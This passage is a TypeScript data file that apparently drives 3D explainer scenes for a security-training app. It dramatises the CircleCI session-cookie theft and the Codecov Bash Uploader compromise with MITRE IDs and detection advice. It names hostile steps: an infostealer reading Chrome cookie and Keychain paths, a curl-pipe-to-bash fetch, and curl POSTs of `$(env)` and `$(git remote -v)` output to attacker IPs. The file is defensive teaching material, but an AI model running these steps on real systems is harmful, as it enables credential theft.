import type { Section3DDescriptor, Section3DKey } from '@/lib/section-3d-registry';

/**
 * Bespoke 3D Story-to-Technical Section Descriptors for SUPPLY_CHAIN_CICD (13 scenarios).
 */
export const SUPPLY_CHAIN_CICD_3D_REGISTRY: Record<
  string,
  Partial<Record<Section3DKey, Section3DDescriptor>>
> = {
  "circleci-oauth-github-token-rotation-breach": {
    "briefing": {
      "scenarioId": "circleci-oauth-github-token-rotation-breach",
      "sectionKey": "briefing",
      "sceneKind": "sup-circleci-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1539",
      "title": "CircleCI CI/CD Supply Chain Breach: Engineer macOS Infostealer, 2FA… — Story-to-Technical Overview",
      "storyCue": "Imagine a master build-automation vault that safeguards secret keys for thousands of software companies. An intruder infects a single senior engineer laptop with a silent pocket-picking program that lifts an already-stamped two-factor entry pass straight from the browser, replays that active pass from abroad to copy both the encrypted customer lockboxes and the live decoding key from the vault control room, and unlocks thousands of customer cloud and code keys offline.",
      "technicalCue": "INITIAL ACCESS: Engineer macOS Infostealer Infection & 2FA-Backed Browser Session Cookie Theft -> DEFENSE EVASION: Session Replay from Foreign IP, Production Database Access & KMS Key Extraction -> LATERAL & C2: Offline Decryption of Customer CI/CD Secrets & Downstream GitHub / AWS Token Replay",
      "storyMappings": [
        {
          "storyTerm": "Silent pocket-picking program lifting a stamped two-factor pass",
          "technicalTerm": "macOS infostealer stealing a 2FA-authenticated browser session cookie",
          "tone": "amber"
        },
        {
          "storyTerm": "Replaying the active pass from abroad to enter the control room",
          "technicalTerm": "Foreign proxy session replay accessing CircleCI production databases and KMS keys",
          "tone": "sky"
        },
        {
          "storyTerm": "Copying both the encrypted lockboxes and the decoding key",
          "technicalTerm": "Exfiltrating customer secret databases alongside runtime encryption keys",
          "tone": "rose"
        },
        {
          "storyTerm": "Unlocking customer cloud and code keys offline",
          "technicalTerm": "Offline decryption and replay of customer GitHub OAuth tokens and AWS keys",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-circleci-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Silent pocket-picking program lifting a…",
          "subtitle": "macOS infostealer stealing a 2FA-authenticated browser session…",
          "tone": "amber"
        },
        {
          "id": "sup-circleci-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Replaying the active pass from abroad to…",
          "subtitle": "Foreign proxy session replay accessing CircleCI production…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Tool Work",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Engineer macOS Infostealer Infection & 2FA-Backed Browser Session Cookie Theft",
          "storyExcerpt": "After a senior engineer installs a trojanized helper tool on a work laptop, a quiet stealer slips inside the browser drawer and copies an already-verified security wristband, skipping the two-factor…",
          "technicalParallel": "Under the hood, the observed step executes macOS Infostealer reads ~/Library/Application Support/Google/Chrome/Default/Cookies & Keychain (which executes the technical command / telemetry directive…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Pass Room",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Session Replay from Foreign IP, Production Database Access & KMS Key Extraction",
          "storyExcerpt": "Wearing the stolen wristband from an overseas relay booth, the intruder walks straight into the central vault control room, wheels out copies of the encrypted customer secret ledgers, and separately…",
          "technicalParallel": "Under the hood, the observed step executes Replay SSO Cookie -> Access production bastion -> Dump customer context/project tables & KMS runtime decryption keys (which executes the technical command /…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Both Key",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "Offline Decryption of Customer CI/CD Secrets & Downstream GitHub / AWS Token Replay",
          "storyExcerpt": "Safe inside their own hideout, the intruder pairs the stolen master decoding key with the copied ledgers to crack open customer build secrets offline, then replays those freshly uncovered GitHub and…",
          "technicalParallel": "Under the hood, the observed step executes Offline AES-GCM Decryption of Customer Project Contexts -> Recover AWS_ACCESS_KEY_ID, GITHUB_TOKEN, SSH Private Keys (which executes the technical command /…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "2FA Kiosk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "CI Conveyor",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stolen Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "circleci-oauth-github-token-rotation-breach",
      "sectionKey": "step-1",
      "sceneKind": "sup-circleci-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Engineer macOS Infostealer Infection & 2FA-Backed Browser Session Cookie Theft",
      "storyCue": "After a senior engineer installs a trojanized helper tool on a work laptop, a quiet stealer slips inside the browser drawer and copies an already-verified security wristband, skipping the two-factor badge gate entirely because the wristband already carries its fresh stamp.",
      "technicalCue": "T1539 · INITIAL ACCESS — An engineer’s corporate macOS laptop is infected by trojanized third-party software carrying an infostealer that bypasses standard antivirus detections and extracts active browser session…",
      "storyMappings": [
        {
          "storyTerm": "Trojanized helper tool on a work laptop",
          "technicalTerm": "Third-party macOS infostealer executing on a privileged engineer endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Already-verified security wristband inside the browser drawer",
          "technicalTerm": "Active 2FA-backed SSO browser session cookie stolen from disk/keychain",
          "tone": "sky"
        },
        {
          "storyTerm": "Skipping the two-factor badge gate",
          "technicalTerm": "Session cookie theft bypassing hardware MFA and antivirus detection",
          "tone": "rose"
        },
        {
          "storyTerm": "Privileged engineer identity",
          "technicalTerm": "Production access rights capable of generating customer data tokens",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-circleci-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Trojanized helper tool on a work laptop",
          "subtitle": "Third-party macOS infostealer executing on a privileged…",
          "tone": "amber"
        },
        {
          "id": "sup-circleci-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Already-verified security wristband…",
          "subtitle": "Active 2FA-backed SSO browser session cookie stolen from…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Tool Work",
          "stageTag": "STEP 01 · SETUP",
          "title": "Trojanized helper tool on a work laptop",
          "storyExcerpt": "After a senior engineer installs a trojanized helper tool on a work laptop, a quiet stealer slips inside the browser drawer and copies an already-verified security wristband, skipping the…",
          "technicalParallel": "Under the hood, the observed step executes macOS Infostealer reads ~/Library/Application Support/Google/Chrome/Default/Cookies & Keychain (which executes the technical command / telemetry directive…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Two-factor",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Already-verified security wristband inside the…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses already-verified security wristband inside the browser drawer to advance toward skipping the two-factor badge gate.",
          "technicalParallel": "An engineer’s corporate macOS laptop is infected by trojanized third-party software carrying an infostealer that bypasses standard antivirus detections and extracts active browser session cookies and…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Two-factor Gate",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Privileged engineer identity",
          "storyExcerpt": "Behind the scenes, privileged engineer identity captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in EDR Event 1 (recording EntryVector=Trojanized macOS software on engineer laptop, StolenCredential=Active 2FA-authenticated SSO session cookie , T1539, ReplayEffect=Bypassed MFA challenge…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "2FA Kiosk",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "CI Conveyor",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stolen Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1539"
    },
    "step-2": {
      "scenarioId": "circleci-oauth-github-token-rotation-breach",
      "sectionKey": "step-2",
      "sceneKind": "sup-circleci-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Session Replay from Foreign IP, Production Database Access & KMS Key Extraction",
      "storyCue": "Wearing the stolen wristband from an overseas relay booth, the intruder walks straight into the central vault control room, wheels out copies of the encrypted customer secret ledgers, and separately grabs the live master decoding key sitting in the vault engine room.",
      "technicalCue": "T1550.004 · DEFENSE EVASION — Replaying the stolen engineer session token from a remote proxy IP, the attacker accesses privileged internal CircleCI production hosts, extracts database encryption keys from the running…",
      "storyMappings": [
        {
          "storyTerm": "Wearing the stolen wristband from an overseas booth",
          "technicalTerm": "Replaying the hijacked session cookie from a foreign proxy IP address",
          "tone": "amber"
        },
        {
          "storyTerm": "Encrypted customer secret ledgers",
          "technicalTerm": "Exfiltrated CircleCI production database dumps containing encrypted CI secrets",
          "tone": "sky"
        },
        {
          "storyTerm": "Live master decoding key in the engine room",
          "technicalTerm": "Stolen runtime encryption / KMS key material protecting customer vaults",
          "tone": "rose"
        },
        {
          "storyTerm": "Central vault control room",
          "technicalTerm": "Privileged internal CircleCI production data and secrets infrastructure",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-circleci-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Wearing the stolen wristband from an…",
          "subtitle": "Replaying the hijacked session cookie from a foreign proxy IP…",
          "tone": "amber"
        },
        {
          "id": "sup-circleci-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Encrypted customer secret ledgers",
          "subtitle": "Exfiltrated CircleCI production database dumps containing…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Room Out",
          "stageTag": "STEP 02 · SETUP",
          "title": "Wearing the stolen wristband from an overseas booth",
          "storyExcerpt": "Wearing the stolen wristband from an overseas relay booth, the intruder walks straight into the central vault control room, wheels out copies of the encrypted customer secret ledgers, and…",
          "technicalParallel": "Under the hood, the observed step executes Replay SSO Cookie -> Access production bastion -> Dump customer context/project tables & KMS runtime decryption keys (which executes the technical command /…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Live",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Encrypted customer secret ledgers",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses encrypted customer secret ledgers to advance toward live master decoding key in the engine room.",
          "technicalParallel": "Replaying the stolen engineer session token from a remote proxy IP, the attacker accesses privileged internal CircleCI production hosts, extracts database encryption keys from the running runtime…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Live Key",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Central vault control room",
          "storyExcerpt": "Behind the scenes, central vault control room captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CloudTrail Event 200 (recording SessionAnomaly=SSO session cookie replayed from new ASN/IP, CompromisedAssets=Production Datastores + Runtime Encryption Keys under T1550.004): Require…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "2FA Kiosk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "CI Conveyor",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stolen Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1550.004"
    },
    "step-3": {
      "scenarioId": "circleci-oauth-github-token-rotation-breach",
      "sectionKey": "step-3",
      "sceneKind": "sup-circleci-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "Offline Decryption of Customer CI/CD Secrets & Downstream GitHub / AWS Token Replay",
      "storyCue": "Safe inside their own hideout, the intruder pairs the stolen master decoding key with the copied ledgers to crack open customer build secrets offline, then replays those freshly uncovered GitHub and cloud keys across downstream company estates.",
      "technicalCue": "T1552.001 · LATERAL & C2 — Combining the exfiltrated database dumps with the stolen runtime encryption keys, the attacker decrypts customer CI/CD environment variables (AWS_SECRET_ACCESS_KEY, NPM_TOKEN, SSH deploy keys…",
      "storyMappings": [
        {
          "storyTerm": "Pairing the master key with copied ledgers offline",
          "technicalTerm": "Offline decryption of customer environment variables, SSH keys, and OAuth tokens",
          "tone": "amber"
        },
        {
          "storyTerm": "Freshly uncovered code and cloud keys",
          "technicalTerm": "Decrypted customer GitHub OAuth tokens, AWS IAM keys, and project API tokens",
          "tone": "sky"
        },
        {
          "storyTerm": "Entering downstream company estates",
          "technicalTerm": "Downstream replay of stolen CI/CD secrets against customer repos and clouds",
          "tone": "rose"
        },
        {
          "storyTerm": "Emergency lock replacement across all tenants",
          "technicalTerm": "Mandatory global rotation of all CircleCI-stored OAuth, SSH, and cloud secrets",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-circleci-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Pairing the master key with copied…",
          "subtitle": "Offline decryption of customer environment variables, SSH…",
          "tone": "amber"
        },
        {
          "id": "sup-circleci-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Freshly uncovered code and cloud keys",
          "subtitle": "Decrypted customer GitHub OAuth tokens, AWS IAM keys, and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Safe Own",
          "stageTag": "STEP 03 · SETUP",
          "title": "Pairing the master key with copied ledgers offline",
          "storyExcerpt": "Safe inside their own hideout, the intruder pairs the stolen master decoding key with the copied ledgers to crack open customer build secrets offline, then replays those freshly uncovered…",
          "technicalParallel": "Under the hood, the observed step executes Offline AES-GCM Decryption of Customer Project Contexts -> Recover AWS_ACCESS_KEY_ID, GITHUB_TOKEN, SSH Private Keys (which executes the technical command /…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Code Keys",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Freshly uncovered code and cloud keys",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses freshly uncovered code and cloud keys to advance toward entering downstream company estates.",
          "technicalParallel": "Combining the exfiltrated database dumps with the stolen runtime encryption keys, the attacker decrypts customer CI/CD environment variables (AWS_SECRET_ACCESS_KEY, NPM_TOKEN, SSH deploy keys, and GitHub…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Lock All",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Emergency lock replacement across all tenants",
          "storyExcerpt": "Behind the scenes, emergency lock replacement across all tenants captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CloudTrail Event 1 (recording ExfiltratedSecrets=Customer Environment Variables, SSH Deploy Keys, GitHub OAuth Tokens, ArchitecturalDefense=Short-lived OIDC Federated Tokens instead of…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "2FA Kiosk",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "CI Conveyor",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stolen Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1552.001"
    }
  },
  "codecov-bash-uploader-ci-env-exfil": {
    "briefing": {
      "scenarioId": "codecov-bash-uploader-ci-env-exfil",
      "sectionKey": "briefing",
      "sceneKind": "sup-codecov-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.002",
      "title": "Codecov Bash Uploader CI/CD Environment Variable Exfiltration — Story-to-Technical Overview",
      "storyCue": "Imagine a popular quality-inspection service whose customers automatically download and run a fresh inspection script straight off the provider public delivery counter every time they build a product, without ever checking the script wax seal. An intruder steals a spare warehouse key left inside an old shipping box, adds one hidden line to the inspection script on the counter, and silently receives a full photocopy of every customer factory key ring before walking straight into their private blueprint rooms.",
      "technicalCue": "INITIAL ACCESS: GCS Bucket Tampering of Hosted codecov.sh Uploader -> EXFIL & IMPACT: Unverified curl | bash Execution & CI Environment Harvesting -> LATERAL & C2: Downstream Private Git Repository Cloning & Signing Key Abuse",
      "storyMappings": [
        {
          "storyTerm": "Spare warehouse key left inside an old shipping box",
          "technicalTerm": "Residual Google Cloud Storage (GCS) service account credential in a Docker image layer",
          "tone": "amber"
        },
        {
          "storyTerm": "Adding one hidden line to the script on the public counter",
          "technicalTerm": "Tampering with the hosted codecov.sh Bash Uploader script in GCS",
          "tone": "sky"
        },
        {
          "storyTerm": "Running the script blind and mailing back the factory key ring",
          "technicalTerm": "Unverified curl | bash execution exfiltrating $(env) CI variables to attacker IPs",
          "tone": "rose"
        },
        {
          "storyTerm": "Walking straight into customer private blueprint rooms",
          "technicalTerm": "Cloning private Git repositories and abusing stolen cloud and signing tokens",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#22D3EE",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-codecov-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Spare warehouse key left inside an old…",
          "subtitle": "Residual Google Cloud Storage (GCS) service account credential…",
          "tone": "amber"
        },
        {
          "id": "sup-codecov-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Adding one hidden line to the script on…",
          "subtitle": "Tampering with the hosted codecov.sh Bash Uploader script in GCS",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Key Left",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "GCS Bucket Tampering of Hosted codecov.sh Uploader",
          "storyExcerpt": "Digging through a discarded container crate used to build the inspection tool, the intruder finds a forgotten storage-room key, unlocks the public delivery shelf, and adds a single silent forwarding line…",
          "technicalParallel": "The tampering remained undetected until a security-conscious customer verified the downloaded script against the published SHA-256 checksum in Codecov’s GitHub repository and noticed the hash mismatch.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. One Line",
          "stageTag": "STAGE 02 · EXFIL & IMPACT",
          "title": "Unverified curl | bash Execution & CI Environment Harvesting",
          "storyExcerpt": "Every time a customer assembly line pulls the unsealed inspection script directly from the web counter and runs it blindly, the hidden line scoops up every password, key card, and token sitting on the…",
          "technicalParallel": "$(git remote -v) captured the repository URL (often containing embedded OAuth tokens like https://x-access-token:ghp_...@github.com/...), and $(env) dumped every environment variable exported into the CI…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Back Key",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "Downstream Private Git Repository Cloning & Signing Key Abuse",
          "storyExcerpt": "Sorting through thousands of stolen customer key rings, the intruder uses automated bot keys to enter downstream companies private blueprint vaults from outside the factory, copying proprietary source…",
          "technicalParallel": "Several high-profile software vendors had their private repositories cloned or GPG signing keys exposed through the CI environment dump, requiring enterprise-wide secret and certificate rotation.",
          "accentHex": "#22D3EE",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Script",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Secret Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Env Leak",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "codecov-bash-uploader-ci-env-exfil",
      "sectionKey": "step-1",
      "sceneKind": "sup-codecov-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "GCS Bucket Tampering of Hosted codecov.sh Uploader",
      "storyCue": "Digging through a discarded container crate used to build the inspection tool, the intruder finds a forgotten storage-room key, unlocks the public delivery shelf, and adds a single silent forwarding line to the official inspection script waiting for thousands of daily customers.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — By extracting a residual Google Cloud Storage (GCS) service account credential from a Codecov Docker image layer, the threat actor gained write access to the GCS bucket hosting…",
      "storyMappings": [
        {
          "storyTerm": "Discarded container crate",
          "technicalTerm": "Codecov Docker image build layer exposing a residual credential",
          "tone": "amber"
        },
        {
          "storyTerm": "Forgotten storage-room key",
          "technicalTerm": "Leaked Google Cloud Storage (GCS) service account key",
          "tone": "sky"
        },
        {
          "storyTerm": "Public delivery shelf",
          "technicalTerm": "Hosted https://codecov.io/bash script object in cloud storage",
          "tone": "rose"
        },
        {
          "storyTerm": "Single silent forwarding line",
          "technicalTerm": "Injected curl POST one-liner capturing all CI runner environment variables",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-codecov-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Discarded container crate",
          "subtitle": "Codecov Docker image build layer exposing a residual credential",
          "tone": "amber"
        },
        {
          "id": "sup-codecov-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Forgotten storage-room key",
          "subtitle": "Leaked Google Cloud Storage (GCS) service account key",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Used Tool",
          "stageTag": "STEP 01 · SETUP",
          "title": "Discarded container crate",
          "storyExcerpt": "Digging through a discarded container crate used to build the inspection tool, the intruder finds a forgotten storage-room key, unlocks the public delivery shelf, and adds a single silent…",
          "technicalParallel": "The tampering remained undetected until a security-conscious customer verified the downloaded script against the published SHA-256 checksum in Codecov’s GitHub repository and noticed the hash mismatch.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Key",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Forgotten storage-room key",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses forgotten storage-room key to advance toward public delivery shelf.",
          "technicalParallel": "By extracting a residual Google Cloud Storage (GCS) service account credential from a Codecov Docker image layer, the threat actor gained write access to the GCS bucket hosting https://codecov.io/bash…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Line",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Single silent forwarding line",
          "storyExcerpt": "Behind the scenes, single silent forwarding line captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Enable cloud storage object integrity monitoring and enforce automated CI checksum checks comparing downloaded script SHA-256 hashes against cryptographically signed vendor release manifests (stopping…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Script",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Secret Chute",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Env Leak",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-2": {
      "scenarioId": "codecov-bash-uploader-ci-env-exfil",
      "sectionKey": "step-2",
      "sceneKind": "sup-codecov-step-2",
      "stageBadge": "STEP #2 · EXFIL & IMPACT",
      "title": "Unverified curl | bash Execution & CI Environment Harvesting",
      "storyCue": "Every time a customer assembly line pulls the unsealed inspection script directly from the web counter and runs it blindly, the hidden line scoops up every password, key card, and token sitting on the assembly bench and mails them straight to an unmarked post-office box.",
      "technicalCue": "T1005 · EXFIL & IMPACT — When customer CI pipelines executed bash <(curl -s https://codecov.io/bash) (the curl | bash anti-pattern that streams remote code directly into a live shell interpreter without prior hash…",
      "storyMappings": [
        {
          "storyTerm": "Pulling and running the unsealed script blindly",
          "technicalTerm": "Unverified bash <(curl -s https://codecov.io/bash) CI pipeline invocation",
          "tone": "amber"
        },
        {
          "storyTerm": "Key cards and tokens sitting on the assembly bench",
          "technicalTerm": "CI runner environment variables exposed via $(env) command substitution",
          "tone": "sky"
        },
        {
          "storyTerm": "Unmarked post-office box",
          "technicalTerm": "Attacker-controlled collection servers (178.62.86.114 and 104.248.94.23)",
          "tone": "rose"
        },
        {
          "storyTerm": "Silent mailing line",
          "technicalTerm": "Background curl HTTP POST exfiltration blended into normal CI coverage uploads",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-codecov-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Pulling and running the unsealed script…",
          "subtitle": "Unverified bash <(curl -s https://codecov.io/bash) CI pipeline…",
          "tone": "amber"
        },
        {
          "id": "sup-codecov-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Key cards and tokens sitting on the…",
          "subtitle": "CI runner environment variables exposed via $(env) command…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Time Line",
          "stageTag": "STEP 02 · SETUP",
          "title": "Pulling and running the unsealed script blindly",
          "storyExcerpt": "Every time a customer assembly line pulls the unsealed inspection script directly from the web counter and runs it blindly, the hidden line scoops up every password, key card, and token sitting…",
          "technicalParallel": "$(git remote -v) captured the repository URL (often containing embedded OAuth tokens like https://x-access-token:ghp_...@github.com/...), and $(env) dumped every environment variable exported into the CI…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Key",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Key cards and tokens sitting on the assembly bench",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses key cards and tokens sitting on the assembly bench to advance toward unmarked post-office box.",
          "technicalParallel": "When customer CI pipelines executed bash <(curl -s https://codecov.io/bash) (the curl | bash anti-pattern that streams remote code directly into a live shell interpreter without prior hash verification)…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Post-office Box",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Silent mailing line",
          "storyExcerpt": "Behind the scenes, silent mailing line captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Audit CI runner network egress logs for outbound HTTP POST requests to 178.62.86.114 or 104.248.94.23 alongside process telemetry capturing curl invoked with $(env) command substitution (confirming live…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Public Script",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Secret Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
